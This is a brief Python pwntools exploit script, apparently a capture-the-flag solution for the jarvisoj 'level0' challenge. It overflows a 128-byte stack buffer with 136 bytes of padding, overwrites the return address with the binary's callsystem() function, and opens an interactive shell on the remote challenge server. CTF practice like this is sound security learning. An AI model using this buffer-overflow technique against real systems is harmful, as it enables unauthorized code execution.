#coding:utf-8
from pwn import *

# p = process('./level0')
p = remote("pwn2.jarvisoj.com", 9881)
e = ELF('./level0')

#获取函数callsystem()的入口地址
addr_callsystem = p64(e.symbols['callsystem'])

#128 + 8：缓冲区长度+ebp长度
payload = (128 + 8) * 'A' + addr_callsystem
print payload

p.recvline()
p.sendline(payload)
p.interactive()
